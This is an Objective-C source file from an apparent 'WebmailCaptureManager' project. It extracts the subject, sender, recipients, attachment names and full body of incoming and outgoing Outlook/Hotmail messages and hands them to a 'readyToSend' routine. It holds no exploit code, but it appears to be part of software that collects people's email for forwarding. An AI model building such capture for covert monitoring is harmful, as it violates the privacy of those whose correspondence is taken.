//
//  WebmailHTMLParser+Outlook.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/21/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "WebmailHTMLParser+Outlook.h"

@implementation WebmailHTMLParser (Outlook)

+ (void) parseOutlook_IncomingJSON: (NSString *) aJSON1 {
    [WebmailHTMLParser parseOutlook_IncomingJSON:aJSON1 otherJSON:@""];
}

+ (void) parseOutlook_IncomingJSON: (NSString *) aJSON1 otherJSON: (NSString *) aJSON2 {
    if (aJSON1 && aJSON2) {
        NSError *jsonError = nil;
        //DLog(@"Outlook aJSON1 : %@", aJSON1);
        NSData *jsonData = [aJSON1 dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *outlookMessage1 = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                        options:NSJSONReadingMutableContainers
                                                                          error:&jsonError];
        
        //DLog(@"Outlook aJSON2 : %@", aJSON2);
        jsonData = [aJSON2 dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *outlookMessage2 = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                        options:NSJSONReadingMutableContainers
                                                                          error:&jsonError];
        NSString *senderAddress = [outlookMessage2 objectForKey:@"sender_address"];
        if ([senderAddress isKindOfClass:[NSNull class]]) {
            senderAddress = [outlookMessage1 objectForKey:@"sender_name"];
        }
        else if (senderAddress.length == 0){
            senderAddress = [outlookMessage1 objectForKey:@"sender_name"];
        }
        
        NSMutableArray *recipientAddresses = [NSMutableArray arrayWithCapacity:1];
        for (NSString *recipient in [outlookMessage1 objectForKey:@"recipient_addresses"]) {
            NSString *clearRecipient = [recipient stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"'"]];
            [recipientAddresses addObject:clearRecipient];
        }
        
        [self readyToSend_subject:[outlookMessage1 objectForKey:@"subject"] sender:[outlookMessage1 objectForKey:@"sender_name"] senderEmail:senderAddress senderImageUrl:nil sentDate:[outlookMessage1 objectForKey:@"received_date"] receiver:[outlookMessage1 objectForKey:@"recipient_names"] receiverEmail:recipientAddresses receiverImageUrl:nil attachment:[outlookMessage1 objectForKey:@"attachment_filenames"] messageBody:[outlookMessage1 objectForKey:@"body_message"] mailType:@"HOTMAIL" direction:0];
        //DLog(@"outlookMessage1 : %@", outlookMessage1);
        //DLog(@"outlookMessage2 : %@", outlookMessage2);
    }
}

+ (void) parseOutlook_OutgoingJSON: (NSString *) aJSON1 {
    if (aJSON1) {
        NSError *jsonError = nil;
        //DLog(@"Outgoing Outlook aJSON1 : %@", aJSON1);
        NSData *jsonData = [aJSON1 dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *outlookMessage1 = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                        options:NSJSONReadingMutableContainers
                                                                          error:&jsonError];
        
        [self readyToSend_subject:[outlookMessage1 objectForKey:@"subject"] sender:[outlookMessage1 objectForKey:@"sender_name"] senderEmail:[outlookMessage1 objectForKey:@"sender_address"] senderImageUrl:nil sentDate:[outlookMessage1 objectForKey:@"send_date"] receiver:[outlookMessage1 objectForKey:@"recipient_names"] receiverEmail:[outlookMessage1 objectForKey:@"recipient_addresses"] receiverImageUrl:nil attachment:[outlookMessage1 objectForKey:@"attachment_filenames"] messageBody:[outlookMessage1 objectForKey:@"body_message"] mailType:@"HOTMAIL" direction:1];
        //DLog(@"Outgoing outlookMessage1 : %@", outlookMessage1);
    }
}

@end
